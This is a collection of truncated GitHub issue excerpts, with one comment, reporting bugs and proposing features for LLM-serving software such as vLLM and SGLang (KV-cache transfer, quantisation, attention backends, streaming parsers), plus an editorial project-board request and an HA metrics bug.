items.title: [Bug] NIXL backend crashes at startup with TypeError when SGLANG_DISAGG_STAGING_BUFFER=1
items.author: zetxqx
items.body_excerpt:
## Checklist

- [x] I searched related issues but found no solution. (Related but distinct: #38552. Open PRs #40909 and #40861 each contain an incidental fix for this, but neither is scoped to it.)
- [x] The bug persists in the latest version. (Reproduced on v0.5.20; code is unchanged on `main` @ `70f0b73` and v0.5.19.)
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion.
- [x] Please use English.

## Describe the bug

With `--disaggregation-transfer-backend nixl` and `SGLANG_DISAGG_STAGING_BUFFER=1` on a **non-MLA** model, the prefill server crashes during `kv_manager` init, before serving any request:

```
TypeError: NixlKVManager.set_kv_buffer_tensors() got an unexpected keyword argument 'slot_layer_ids'
```

The decode server hits the same call on its role-switch path (`decode.py`).

**Root cause** — a signature drift between the two transfer backends:

- `prefill.py` (`_init_kv_manager`) and `decode.py` both call
  `kv_manager.set_kv_buffer_tensors(k_buffers, v_buffers, page_size, slot_layer_ids=...)`.
- `MooncakeKVManager.set_kv_buffer_tensors` accepts `slot_layer_ids`
  ([mooncake/conn.py#L491](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/mooncake/conn.py#L491)).
- `NixlKVManager.set_kv_buffer_tensors` still takes only `(k_buffers, v_buffers, page_size)`
  ([nixl/conn.py#L624](https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/nixl/conn.py#L624)).

The rest of the NIXL staging path (`send_kvcache_staged`, `STAGING_REQ/RSP` handling, decode-side `StagingAllocator`) is implemented; only this setter is out of sync. In the log below you can see the NIXL `KVManager` initialize and the four per-worker staging buffers get allocated successfully right before the crash.

**Scope notes**

- Happens **regardless of TP topology**. The flag is evaluated at init, not per request, so homogeneous TP crashes too, even though staging would never be used for that topology.
- Only affects non-MLA models (GQA/MHA, including SWA hybrids). For MLA models the call is skipped by the `not self.is_mla_backend` guard, and decode raises a separate, intentional `RuntimeError`.
- The same command with `--disaggregation-transfer-backend mooncake`, or with the env var unset, starts fine.

## Reproduction

Minimal: a single prefill server, small GQA model, TP=1, 1× H100. No decode side or request is needed; the crash happens at startup.

```bash
SGLANG_DISAGG_STAGING_BUFFER=1 \
python -m sglang.launch_server \
  --model-path Qwen/Qwen3-0.6B \
  --disaggregation-mode prefill \
  --disaggregation-transfer-backend nixl \
  --tp 1 \
  --port 30000
```

Output (abridged to the relevant tail):

```

items.title: [Feature]: Add a 2-bit KV-cache quantisation backend from Together AI
items.author: zhangj1an
items.body_excerpt:
### 🚀 The feature, motivation and pitch

## Purpose

Integrate a new INT2 KV-cache quantisation backend.

Paper:**OSCAR** ([arXiv:2605.17757](https://arxiv.org/abs/2605.17757)). 
Code: https://github.com/FutureMLS-Lab/OSCAR 
(500+ stars, proved to be working on Qwen3-32B, GLM-4.7-FP8.)
Website: https://oscar-quantize.github.io/

vLLM already has TurboQuant, a data-free Hadamard-rotation KV-cache quantizer. Oscar is similar, but has better accuracy. If we apply the most aggresive quantisation method in TurboQuant, (`turboquant_3bit_nc`), the accuracy will drop by 20%. But with Oscar, for Qwen3-32B and GLM-4.7-FP8 respectively, the mean gap to BF16 is −0.02, and +0.27 points while reducing KV memory by ~8× and increasing large-batch throughput by up to ~7×. 

The main idea is, before applying clipped INT2 scalar quantization, we first apply a per-layer covariance-aware orthogonal rotation to distribute the values evenly, so they can be later de-quantised with higher precision. 

To use this feature, just need to load the original model checkpoints, and download a small per-layer rotation file
(`[head_dim, head_dim]` orthogonal matrices, a few MB), published in the [OSCAR RotationZoo](https://huggingface.co/Zhongzhu/OSCAR-RotationZoo).

## CC List
Paper author: @zzz0906
vLLM maintainer: @mgoin, @robertgshaw2-redhat 

## Implementation Details
- We stored rotation matrix for K and V. 
- Then, we use the same fp16 `(scale, zero)` parameter for each vector. We then store these values by re-using TurboQuant's `TQFullAttentionSpec` in a Combined `[key_packed | value_packed]` slot (72 B/token/kv-head
  at `head_dim=128`). 
- We also introuced 3 additional triton kernels for this feature. Fused Triton store (quant + pack + scatter) and split-KV decode attention (INT2 unpack + online softmax + AV), plus a full-dequant kernel for the continuation-prefill path.

We will mainly change these files:
- `vllm/model_executor/layers/quantization/oscar/`: config,  rotation loading.
- `vllm/v1/attention/backends/oscar_attn.py`: prefill (BF16 attention + INT2 store), decode (rotate-Q → INT2 score/AV → `R_vᵀ` output).
- `vllm/v1/attention/ops/triton_oscar_{store,decode}.py`: fused Triton INT2 pack/store and split-KV decode-attention kernels.

Usage:

```bash
export VLLM_OSCAR_K_ROTATION_PATH=.../Qwen3-32B/.../k_rotation_qqt_r_h_pbr.pt
export VLLM_OSCAR_V_ROTATION_PATH=.../Qwen3-32B/.../v_rotation_sst_r_h_pbr.pt
export VLLM_OSCAR_K_CLIP_RATIO=0.96 VLLM_OSCAR_V_CLIP_RATIO=0.92
vllm serve Qwen/Qwen3-32B --kv-cache-dtype oscar_int2
```

## Reduce in KV-cache memory

As reported by paper, at `head_dim=128`, per token per KV head:

| Scheme | bytes | bits/elem | ratio |
|---|---|---|---|
| BF16 (K+V) | 512 | 16.0 | 1.0× |
| OSCAR INT2 slot | 72 | 2.25 | **7.11×** |
| OSCAR effective (4/64 layers BF16) | 99.5 | 3.11 | **5.15×** |

## Test plan

1. **Kernel correctness**: `tests/quantization/test_oscar.py`: INT2 store→dequant round-trip vs a PyTorch reference quantizer, and the fused INT2 decode kernel vs reference attention over the dequantized cache.
2. **End-to-end coherence**: Qwen3-32B, `--kv-cache-dtype oscar_int2` with the RotationZoo rotations.
3. **Accuracy**: GPQA-Diamond, BF16 vs OSCAR INT2, Qwen3-32B (thinking enabled).


## Not a duplicate

Checked before opening (please re-run; `gh` was unavailable in the dev sandbox):
```
gh pr list --repo vllm-project/vllm --state open --search "OSCAR"
gh pr list --repo vllm-project/vllm --state open --search "INT2 KV cache"
gh issue list --repo vllm-project/vllm --search "OSCAR 2-bit KV"
```
No existing OSCAR / INT2-KV-cache backend in `main`; the only adjacent work is TurboQuant (3-bit, data-free), which this complements at the 2-bit frontier.


### Alternatives

- Use `turboquant_3bit_nc`. It would incur ~50% larger KV than OSCAR INT2 and performs worth on reasoning at the 2-bit frontier, as stated by the paper.
- Per-tensor INT2 without calibrated rotation. The model will just collapse (verified on my local test. identity-rotation INT2 on Qwen3 produces incoherent text).

### Additional context

High accuracy, low-bit quantisation method is becoming increasing important in production use, such as autoround in `llm-compressor`.  So we believe this algo will be a valuable add. 

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.author: ZhandosSeitkaliyev
items.body_excerpt:
### Your current environment

`collect_env.py` could not be run on this host — no outbound internet access (air-gapped deployment). Manually collected equivalent below.

**Versions**
- vLLM: `0.27.0` (build `vllm-0.27.0-tp4-41db7380`)
- PyTorch: `2.13.0+cu129`
- Transformers: `5.15.0`
- GPU: 4x NVIDIA H200 (143771 MiB), driver `595.58.03`

**Model**
- `MiniMaxAI/MiniMax-M3`
- Quantization: `mxfp8` (NVIDIA ModelOpt MXFP8 checkpoint, `weight_block_size=[1,32]`, MoE via `MarlinMxfp8LinearKernel`/`MARLIN` backend) — vLLM's own startup log flags this format as *"experimental and could change in future"*

**Launch command**
```bash
vllm serve /model --served-model-name MiniMaxAI/MiniMax-M3 \
  --tensor-parallel-size 4 --block-size 128 --max-model-len 65536 \
  --gpu-memory-utilization 0.93 --tool-call-parser minimax_m3 \
  --reasoning-parser minimax_m3 --enable-auto-tool-choice \
  --host 0.0.0.0 --port 8000
```



### 🐛 Describe the bug

With `stream: true` and `tools` provided, for requests where the model's reasoning is longer / more hedging before deciding to call a tool, the SSE stream **stops immediately after the reasoning block closes**: the next chunk has an empty `delta` and `finish_reason: "stop"`. Nothing is generated after that — no content, no `tool_calls`. This is not a parsing failure; generation itself halts.

The byte-identical payload sent with `"stream": false` succeeds reliably (tested 6/6).

> **Note:** only reproduced so far on an MXFP8-quantized checkpoint (NVIDIA ModelOpt format). Untested whether an unquantized bf16 checkpoint is also affected.

**Minimal repro**

Flat 2-field tool schema — confirmed tool schema complexity/count is not the trigger (fails the same way with 1 tool or 5 tools):

```python
import requests

payload = {
    "model": "MiniMaxAI/MiniMax-M3",
    "stream": True,
    "messages": [{"role": "user", "content": "сделай docx с названием test и текстом привет"}],
    "tools": [{
        "type": "function",
        "function": {
            "name": "generate_docx_report",
            "description": "Generate a Word document from content.",
            "parameters": {
                "type": "object",
                "properties": {
                    "filename": {"type": "string"},
                    "content": {"type": "string"},
                },
                "required": ["filename", "content"],
            },
        },
    }],
    "tool_choice": "auto",
}

r = requests.post("http://localhost:8000/v1/chat/completions", json=payload, stream=True)
for line in r.iter_lines():
    if line:
        print(line.decode())
```

**Expected**

Reasoning closes, then either visible content or a populated `tool_calls` delta follows — same as the non-streaming response to the identical payload (`"stream": False` above).

**Observed**

After the last reasoning chunk, the stream emits one more chunk with an empty delta and `finish_reason: "stop"`, then ends. Nothing else is generated.

**Ruled out**
- Tool schema size — reproduces with both a minimal flat 2-field schema and a real ~2KB docstring-heavy schema
- Tool count — 1 tool vs 5 tools, same result
- Payload size in general — byte-identical payloads, only `stream` differs

**Correlation observed (not confirmed causal)**

Requests where the model's own reasoning is short/decisive stream through fine. Requests where reasoning is longer with self-correction (*"But I should check... Actually... Let me reconsider..."*) reliably hit the halt.

**Current workaround**

Routing tool-decision through a separate non-streaming call instead of native streaming tool-calling (application-level, not a real fix — costs 2x LLM calls per turn).



### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: [Performance]: gfx1100 ranks ROCM_ATTN above TRITON_ATTN for a custom kernel it does not use at head_size 256
items.author: cadamcat
items.body_excerpt:
### Summary

On gfx1100 the ROCm selector has two eligible attention backends for this model and takes `ROCM_ATTN`, by the static priority order set in #36702. That order ranks `ROCM_ATTN` first for its custom paged-attention HIP kernel, but on RDNA that kernel is only instantiated at `head_size == 128`. On a `head_size` 256 model it is never called, both candidates run Triton kernels, and **the one the selector rejects is faster at decode at every depth measured** — 1.28x at 500 tokens rising to 10.74x at 32 K.

The obvious answer is that #45916 fixes `ROCM_ATTN`'s decode, and it does. The reason this is still worth reporting is that **the ranking question survives it**: with #45916 on `ROCM_ATTN` and #52684 on `TRITON_ATTN`, the selector's choice still costs 15.1 % of decode at 32 K and buys 4.4 % of prefill.

### Where the ranking premise fails

`ROCM_ATTN` does not call the HIP kernel directly. `rocm_attn.py` calls `chunked_prefill_paged_decode(...)`, which chooses:

```
chunked_prefill_paged_decode.py:373   use_custom = use_rocm_custom_paged_attention(...)
chunked_prefill_paged_decode.py:392   if use_custom:  ops.paged_attention_rocm(...)     # the HIP kernel
chunked_prefill_paged_decode.py:461   else:           kernel_paged_attention_2d[...]    # a Triton kernel
```

and the RDNA branch of that predicate (`rocm.py:410-422`) requires

```python
_ON_GFX1X and ... and head_size == 128 and block_size == 16
and (gqa_ratio >= 3 and gqa_ratio <= 16) and ...
```

At `head_size` 256 it is False, so `ROCM_ATTN` runs `kernel_paged_attention_2d` while `TRITON_ATTN` runs `unified_attention`. Two Triton kernels, and the selector prefers one of them for a property that neither has here.

That is recorded at runtime rather than read off the predicate. Both `ROCM_ATTN` arms log

```
WARNING [chunked_prefill_paged_decode.py:419] Cannot use ROCm custom paged
attention kernel, falling back to Triton implementation.
```

and the kernels their JIT monitor then reports compiling during inference are `kernel_paged_attention_2d` and, with #45916, `kernel_paged_attention_2d_splitkv{,_reduce}`. The two `TRITON_ATTN` arms carry neither line and compile `kernel_unified_attention` instead. The custom HIP kernel is never entered in any of the four arms.

`_get_backend_priorities` cannot express this: it takes `use_mla`, `use_sparse` and `use_kv_connector`, and never sees `head_size`. On gfx1100 AITER is unavailable, so the list is `['ROCM_ATTN', 'TRITON_ATTN']` and the order alone decides.

### Environment

```
2x AMD Radeon RX 7900 XT (gfx1100, RDNA3), TP=2, ROCm 10.0
vLLM 0.27.1.dev5+gf46a9dfe2.d20260827
model  Qwen3.8-27B-AWQ-INT4, from its own config.json: head_dim 256,
       num_attention_heads 24, num_key_value_heads 4 -> num_queries_per_kv = 6,
       64 layers = 48 linear_attention + 16 full_attention
serve  --max-model-len 33000 --max-num-seqs 16 --tensor-parallel-size 2
       --gpu-memory-utilization 0.92 ; enable_prefix_caching=False
```

`vllm/v1/attention/ops/triton_unified_attention.py` in this image is **byte-identical to `main`** (md5 `49fab3b643bf5a88eb65303ce377996b`, 1189 lines, zero differing lines against `5e71a11e`), so arms C and D below are measurements of main's own kernel and #52684 applies to it with no rejected hunks. `chunked_prefill_paged_decode.py` differs from main by 56 lines, all inside `kernel_paged_attention_2d`, where main skips the per-token load mask on non-final tiles. That is a speedup to exactly the kernel arm A runs, so **arm A understates main by an amount I have not measured**.

### The four arms

Same machine, same day, no service allowed back onto the cards between them. Within each pair the serve command is identical; what varies is which file is in site-packages, asserted by md5 before every arm.

| arm | `--attention-backend` | `triton_unified_attention.py` | `chunked_prefill_paged_decode.py` |
|---|---|---|---|
| A | *(none; selector picks ROCM_ATTN)* | image = main | image |
| B | *(none; selector picks ROCM_ATTN)* | image = main | + #45916 |
| C | `TRITON_ATTN` | image = main | + #45916 |
| D | `TRITON_ATTN` | + #52684 | + #45916 |

11 rungs from 500 to 32 000, two rounds each, grouped by target length. A rung is shown only when its two rounds agree within 8 %; cells are the mean of the two. 44 measurements per arm, 0 errors, decode 11/11 rungs on all four arms.

### Decode, tok/s

| ctx | A | B | C | D | C/A | D/B |
|---|---:|---:|---:|---:|---:|---:|
| 500 | 38.45 | 49.62 | 49.23 | 49.33 | 1.28x | 0.994 |
| 2 000 | 27.01 | 48.88 | 48.75 | 48.86 | 1.81x | 0.999 |
| 4 000 | 19.30 | 47.84 | 48.22 | 48.28 | 2.50x | 1.009 |
| 8 000 | 12.38 | 45.82 | 47.25 | 47.28 | 3.82x | 1.032 |
| 16 000 | 7.17 | 42.18 | 45.27 | 45.37 | 6.31x | 1.076 |
| 24 000 | 5.06 | 39.16 | 43.51 | 43.58 | 8.60x | 1.113 |
| 32 000 | 3.90 | 36.43 | 41.91 | 41.95 | **10.74x** | **1.151** |

`C/A` is what the ranking costs on the image as it ships. `D/B` is what it still costs once both open PRs are in: the two are level to 4 000 and `TRITON_ATTN` pulls away after.

### Prefill, tok/s

| ctx | A | B | C | D | D/B |
|---|---:|---:|---:|---:|---:|
| 1 000 | 1029.1 | 952.7 | 970.3 | 983.2 | 1.032 |
| 4 000 | 1013.1 | 990.6 | 959.7 | 986.2 | 0.996 |
| 8 000 | 1013.5 | 1017.0 | 952.0 | 1016.8 | 1.000 |
| 16 000 | 1012.5 | 1015.5 | 862.6 | 1004.8 | 0.989 |
| 24 000 | 983.3 | 995.4 | 770.2 | 963.9 | 0.968 |
| 32 000 | 964.8 | 965.8 | 692.0 | 923.4 | **0.956** |

**Prefill is where `ROCM_ATTN` is genuinely ahead**, and this is the cost side of the report rather than the case for it. Fitting `t(n) = a + b*n + c*n²` over the chart-grade rungs, taking the faster round of each:

| arm | rungs | a ms | b µs/tok | c ns/tok² | r² |
|---|---:|---:|---:|---:|---:|
| A | 11/11 | 52.5 | 942.4 | **2.79** | 1.0000 |
| B | 10/11 | 219.6 | 919.8 | **3.23** | 0.9999 |
| C | 10/11 | 358.7 | 848.2 | **18.17** | 1.0000 |
| D | 10/11 | 260.8 | 886.0 | **5.84** | 1.0000 |

`TRITON_ATTN` is the better backend on the line

comments.author: apex-mochen
comments.body:
I re-measured both halves of this on current `main` with the Qwen3-0.6B tokenizer, and both reproduce as described. Three things that matter for whoever lands the fix, since #55210 and #56262 are both open against this:

**1. The defect has three independent copies, and neither open PR reaches all of them.** Both PRs patch exactly `basic_parsers.py` + `olmo3_reasoning_parser.py`. That does fix `deepseek_r1`, `step3p5` and `hy_v3` — all three call `super().extract_reasoning_streaming()` and only re-branch when `start_token_id not in delta_token_ids`, so the base-class change reaches them. It does not reach:

- `ernie45_reasoning_parser.py` — never calls `super()`; it is a standalone reimplementation of the same four-way branch, ending in the identical `else: return DeltaMessage(reasoning=delta_text)`.
- `hy_v4_reasoning_parser.py` — `HYV4ReasoningExtractor` is a standalone class (the parser only adapts it) carrying its own copy: `elif self.start_token_id in delta_token_ids: ... else: return ReasoningDelta(reasoning=delta_text, content=None)`.

So after either PR, `ernie45` still leaks the marker, and `hy_v4` still does on any path where the start token is emitted rather than prompt-injected.

**2. Two in-tree parsers already get this right by construction**, which may be the better pattern to copy than patching branches: `k2_horizon` keeps a text buffer and strips the start token in `_strip_stream_start()`, and `minimax_m3` derives its deltas from `_visible_segments(previous_text/current_text)` so it never hands raw `delta_text` back. Neither cares how many tokens a delta carries.

**3. The live-repro blocker in the report is only half the story.** The report says a server-level witness wasn't possible because the marker always arrives in its own delta. I checked the other half — whether the marker is even visible in `output.text` — and it is:

- `<think>` (id 151667) is in `tokenizer.get_added_vocab()` but **not** in `all_special_tokens`, so vLLM's skip-special check at `vllm/tokenizers/detokenizer_utils.py:36` (`token in set(tokenizer.all_special_tokens)`) does not drop it. Feeding `["<think>","step","one"]` through `_convert_tokens_to_string_with_added_encoders(..., skip_special_tokens=True)` returns `'<think>step one'`.
- So `delta_text` does carry the marker at server defaults, and the only thing between this and a live repro is a step that accepts the marker together with a neighbour — the spec-decode timing the report already identifies.

That difference also makes the two open patches behave differently in the *inverse* shape — a marker that is a genuine special token, so the text has it stripped while `delta_token_ids` still holds the id. There `delta_text.find(start_token)` is `-1`: #55210 guards it (`if start_index >= 0 else delta_text`), #56262 does not, and `delta_text[start_index + len("<think>"):]` becomes `delta_text[6:]`. Measured with `delta_text="step one"` that yields `"ne"` — it silently eats the first `len(start_token) - 1` characters of the first reasoning delta.

**On the `olmo3` half**, the mechanism is an early `return` inside `process_buffer()`'s `end_think_idx > 0` branch, which preempts the `state == CONTENT` flush below it; the trailing text stays in `self.buffer`, and the caller's recovery path is gated on `delta_message is None` so it cannot fire. Confirmed: streaming one delta gives `(reasoning='PRIVATE', content=None)` while `extract_reasoning` gives `('PRIVATE', 'PUBLIC')`. Since the text is retained rather than destroyed, the symptom is really "the tail is delayed by one chunk, and lost if no further delta arrives".

Worth coordinating before both land: #48160 deletes `olmo3_reasoning_parser.py` entirely (−317) and moves this parser onto the streaming engine, and its thread already covers this symptom.

items.title: [Feature]: Shared per choice `ChatStreamProcessor` for chat serving and streaming derender
items.author: hickeyma
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Tracking issue for a follow up from the #50550 review, where @sagearc asked whether streaming chat derender could use a shared `ChatStreamProcessor` (https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193).

#### Why

After #50550, streaming chat derender (`OnlineDerenderer._derender_chat_stream_parsed`) produces the same `reasoning` / `content` / `tool_calls` deltas that `/v1/chat/completions` streams for the same tokens. To do that it repeats the per choice post parse steps from `OpenAIServingChat.chat_completion_stream_generator`:

- building the parser (`parser_cls(tokenizer, tools, chat_template_kwargs=..., model_config=...)`)
- one `parse_delta` call per chunk
- tracking `tools_streamed`
- rewriting `finish_reason` to `tool_calls` unless a function was named in `tool_choice`
- `maybe_filter_parallel_tool_calls`

The two copies match today. Only code review keeps them that way until the streaming parity tests from #47161 PR3 land and any change to parser handling has to be made in both places. Streaming logprobs on the parsed derender path (after #55029) will add another shared rule drop: logprobs and token IDs when reasoning is hidden (`hide_stream_metadata` in serving).

#### Proposal

Pull a per choice processor out of `chat_completion_stream_generator`. It owns the parser and `tools_streamed` and handles one chunk per step: `parse_delta` → `finish_reason` → parallel tool call filter.

- **Chat serving** uses it for live output. The generator keeps what only serving needs:
  - skipping `None` deltas (unless it's the finish chunk or `return_token_ids` is set)
  - reasoning token counts for usage
  - delta logging
  - error finish reasons
  - `stop_reason` and `token_ids` on the chunk
- **Streaming derender** uses it for both replay and the current chunk. The derenderer keeps what only derender needs:
  - the replay loop over `output_chunk_lens`
  - tool call ID pinning via `last_tool_call_ids`
  - always returning a chunk
  - reading and returning `stream_state`

Responses API streaming stays out. It also calls `parse_delta` but emits a different event shape.

The shared part is thin, so getting the interface right matters more than how much code moves. For chat serving this is a pure refactor with no change to what `/v1/chat/completions` streams. ChatStreamProcessor` is the name from the review and it can change.

#### Sequencing

This should come after #50550 and streaming logprobs (#55029, then the parsed path), so the processor is shaped around both users as they end up. The chat streaming change can then be reviewed on its own. If this lands before the parser cache (#57571), the cache could hold this processor instead of a bare `Parser`.

#### Done when

- [ ] Processor extracted from `chat_completion_stream_generator`. Existing chat streaming and reasoning / tool parser tests pass unchanged.
- [ ] Streaming chat derender moved onto it. `test_derender_stream.py` passes unchanged.
- [ ] The hidden reasoning rule for logprobs and token IDs lives in the processor, so the parsed derender path applies it too.

### Alternatives

- **Do it before #50550 merges as a small PR that #50550 rebases on.** I proposed this in the review (https://github.com/vllm-project/vllm/pull/50550#discussion_r4005719757), then switched to a follow up (https://github.com/vllm-project/vllm/pull/50550#discussion_r4035126957). The code around the shared steps differs enough that it's easier to shape the processor once derender streaming and #55029 are in.
- **Keep the two copies.** Cheapest option. The streaming parity tests from #47161 PR3 would catch drift after the fact but every parser handling change would still have to be made twice.
- **Include the Responses API loop.** It emits a different event shape, so it's a bigger change for little gain.

### Additional context

- RFC #47161 (streaming derender), PR #50550
- #50550 review thread: https://github.com/vllm-project/vllm/pull/50550#discussion_r3913908193
- #55029: streaming logprobs for derender
- Parser cache / server side parser state: #57571

items.title: [Bug][KV Connector] MultiConnector on prefill silently disables the hybrid KV cache manager, so a NixlConnector decode rejects every transfer with an opaque "NIXL compatibility hash mismatch"
items.author: ibrahimnd2000
items.body_excerpt:
### Your current environment
vLLM v0.31.0 (CUDA 13.0 image), nixl 1.4.1 (LIBFABRIC backend over EFA), 2 nodes, TP8 per node, B300. Model zai-org/GLM-5.3 (DeepSeek-V3.2-style: MLA + DSA indexer cache), `--kv-cache-dtype fp8_e4m3`, MTP 1, `--block-size 64`.

### Describe the bug
Prefill/decode disaggregation works with `NixlConnector` on both sides. To keep CPU KV offload on the prefill node, we switched only the prefill instance to a `MultiConnector`:

```json
{"kv_connector": "MultiConnector", "kv_role": "kv_both",
 "kv_connector_extra_config": {"connectors": [
   {"kv_connector": "NixlConnector", "kv_role": "kv_both", "kv_connector_extra_config": {"backends": ["LIBFABRIC"]}},
   {"kv_connector": "LMCacheConnectorV1", "kv_role": "kv_both"}]}}
```

The decode instance kept plain `NixlConnector`. On startup the prefill logs:

```
WARNING [vllm.py] Turning off hybrid kv cache manager because `--kv-transfer-config` selects a KV connector that does not support it.
```

The decode instance keeps the hybrid KV cache manager on (NixlConnector supports it). From then on every request fails on decode at the handshake:

```
File ".../kv_connector/v1/nixl/base_worker.py", line 1101, in _nixl_handshake
    raise RuntimeError(
RuntimeError: NIXL compatibility hash mismatch. Local: ac9aa5b3…, Remote: d6e05114…
```

The client gets HTTP 500 and the prefill side releases the KV when the lease expires. Starting the decode with `--disable-hybrid-kv-cache-manager` makes the layouts (and hashes) match, and P/D with the MultiConnector prefill then works correctly (cache hits from the offload connector, correct outputs).

The check itself is right: refusing the transfer is much better than reading a different layout. The problem is that nothing tells the operator which setting differs, and the setting was changed implicitly by choosing a connector on one side only.

### Suggestions
1. Include the differing fields in the "compatibility hash mismatch" error (or log the hashed fields on both sides), e.g. "hybrid KV cache manager: enabled (local) vs disabled (remote)".
2. Document in the NIXL / MultiConnector docs that both P and D must use the same `--disable-hybrid-kv-cache-manager` setting, and that a MultiConnector containing a connector without HMA support turns it off implicitly.
3. Optionally, log a hint next to the "Turning off hybrid kv cache manager" warning when a NixlConnector is among the MultiConnector children, since the remote side very likely needs the same flag.

items.title: [Bug]: TRITON_MLA decode exceeds shared memory on sm_120 (RTX PRO 6000 / RTX 5090): "Required: 102400, Hardware limit: 101376"
items.author: shiv-oxmiq
items.body_excerpt:
### Your current environment

- vLLM 0.31.0 (official `vllm/vllm-openai` image), Triton 3.7.1
- 2x NVIDIA RTX PRO 6000 Blackwell Workstation Edition (compute capability 12.0), TP=2, PCIe
- Model: `sarvamai/sarvam-105b-fp8` (`SarvamMLAForCausalLM`, `kv_lora_rank` 512, `qk_rope_head_dim` 64), `--kv-cache-dtype fp8`

### 🐛 Describe the bug

On sm_120, `TRITON_MLA` is the only MLA backend offered ("Using TRITON_MLA attention backend out of potential backends: ['TRITON_MLA']"). The model loads and `/health` returns 200, then the first decode step fails. The same failure happens during CUDA-graph warmup; `--enforce-eager` only moves it to the first request.

```text
triton.runtime.errors.OutOfResources: out of resource: shared memory, Required: 102400, Hardware limit: 101376. Reducing block sizes or `num_stages` may help.
```

Cause: `_decode_grouped_att_m_fwd` in `vllm/v1/attention/ops/triton_decode_attention.py` launches the MLA shape (`BLOCK_DMODEL=512`, `BLOCK_DPE=64`, `BLOCK_N=32`, `BLOCK_H=16`) with `num_stages=2`, which needs 102,400 bytes. sm_120 allows 101,376 bytes per block. The existing guard drops to one stage only when `BLOCK_DMODEL >= 1024`, so it never fires for MLA (latent width 512). Hopper and datacenter Blackwell have about 227 KB, so this does not show up there. Any MLA model (DeepSeek-style, Lk = 576) should hit it on these GPUs.

Standalone reproduction (one GPU, no model needed):

```python
import torch
from vllm.v1.attention.ops.triton_decode_attention import decode_attention_fwd

dev = torch.device("cuda:0")
B, H, LORA, ROPE, PAGE, SEQ, SPLITS = 4, 32, 512, 64, 16, 1000, 2
LK = LORA + ROPE
pages = (SEQ + PAGE - 1) // PAGE
q = torch.randn(B, H, LK, dtype=torch.bfloat16, device=dev)
k_scale = torch.tensor(0.05, device=dev)
cache = (torch.randn(B * pages, PAGE, 1, LK, device=dev) / k_scale).to(torch.float8_e4m3fn)
block_table = torch.arange(B * pages, device=dev, dtype=torch.int32).view(B, pages)
seq_lens = torch.full((B,), SEQ, device=dev, dtype=torch.int32)
o = torch.zeros(B, H, LORA, dtype=torch.bfloat16, device=dev)
lse = torch.zeros(B, H, dtype=torch.bfloat16, device=dev)
logits = torch.empty(B, H, SPLITS, LORA + 1, dtype=torch.float32, device=dev)
decode_attention_fwd(q, cache, cache[..., :LORA], o, lse, block_table, seq_lens, logits,
                     SPLITS, (128 + ROPE) ** -0.5, PAGE, k_scale=k_scale, v_scale=k_scale, is_mla=True)
torch.cuda.synchronize()
```

On an RTX PRO 6000 this raises the error above. With `num_stages=1` it runs, and the output matches a PyTorch reference (max abs error 8.2e-4, reference absmax 0.27).

`VLLM_MLA_DISABLE=1` does not avoid it: the executor still selects `TRITON_MLA`.

### Proposed fix

Key the one-stage fallback on the device's shared memory as well as `BLOCK_DMODEL`: use `num_stages=1` when `max_shared_mem` is below 128 KiB (the 101,376-byte parts). A patch that does this fixes the full model on 2x RTX PRO 6000. A PR with this change follows.

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: Editorial project board for blog posts
items.author: quaid
items.body_excerpt:
**Label**
new feature, github

**Is your feature request related to a problem? Please describe.**
As a blog post publisher, I need a way to show authors, translators, and other editors where a blog post is in the process of writing, reviewing, translating, and publishing.

As a blog post editor, I need to know at a glance where a blog post is in the process of developing -> drafting -> reviewing -> editing -> translating -> being ready-to-publish.

**Describe the solution you'd like**
I want a GitHub project board viewed in the Kanban board style, with these columns in this order, including the role in parenthesis for the approver at each step:

1. Blog idea (free to choose)
2. Drafting (author)
3. Development edit (editor)
4. Revising (author)
5. Reviewing (editor)
6. Copyediting (editor)
7. Translating (translator)
8. Ready-to-publish (editor)
9. Published (publisher)

We will also need a new Issue template for submitting a blog idea or blog draft.
The issue template needs these fields/sections:

* Blog post idea or suggestion (be as detailed as necessary)
* Suggested author, if not yourself
* Publication restrictions (specify if there are any dates to be aware about for publishing)
* Other notes

Note at the top of this blog idea template that it should **not** be used for embargoed blog posts, such as related to a security incident or other non-public information or event.

**Describe alternatives you've considered**
Alternatives would be:

1. A different service to host Kanban
2. Spreadsheet

A different service means everyone who authors, edits, translates, or publishes blog posts has to create a new account. All of the people who are in that category now and in the future will need GitHub accounts already for other work in the project, so this keeps us in the single service.

An advantage of GitHub over other solutions is that cards on the Kanban board are numbered Issues in the repo. Blog posts can then be connected to GitHub actions and automation for its own work and to be connected to coding work and releases. A similar process works for longer-form documentation that is manually written and edited.

Using a spreadsheet is better than nothing but does not easily scale to allow others to see the status of blog posts. It raises account access issues as well, being more likely a hack of the Google allowed actions to e.g. host the spreadsheet on a personal account because there is no access allowed through the enterprise account.

**Additional context**
You can see an example of this editorial board that has been in use for six years to coordinate writers, editors, and translators:  https://github.com/orgs/theopensourceway/projects/2

items.title: [Bug]: HA snapshot recovery does not update applied sequence metric
items.author: Icedcoco
items.body_excerpt:
### Bug Report

### Summary

When an HA standby starts from a batch OpLog snapshot, the snapshot state and recovery cursor are restored successfully, but the exported `ha_oplog_applied_sequence_id` metric remains at its initial value. This makes the metric disagree with the standby's actual recovery position.

### Reproduction

The issue is reproducible with a snapshot whose recovered sequence is `117` and which has no incremental OpLog entries to apply after the snapshot:

1. Create and publish a valid batch OpLog snapshot covering sequence `117`.
2. Start an HA standby with snapshot bootstrap enabled.
3. Allow snapshot recovery to complete and the standby to enter `WATCHING`.
4. Read the standby metrics and synchronization status.

Observed result:

```text
recovery log:          snapshot/applied = 117
OpLogApplier expected:  118
snapshot applied batch: 51
standby state:          WATCHING
sync status applied:    117
ha_oplog_applied_sequence_id: 0
```

The standby's internal cursor and synchronization status show that sequence `117` has been recovered, while the exported applied-sequence gauge still reports `0`.

### Root cause

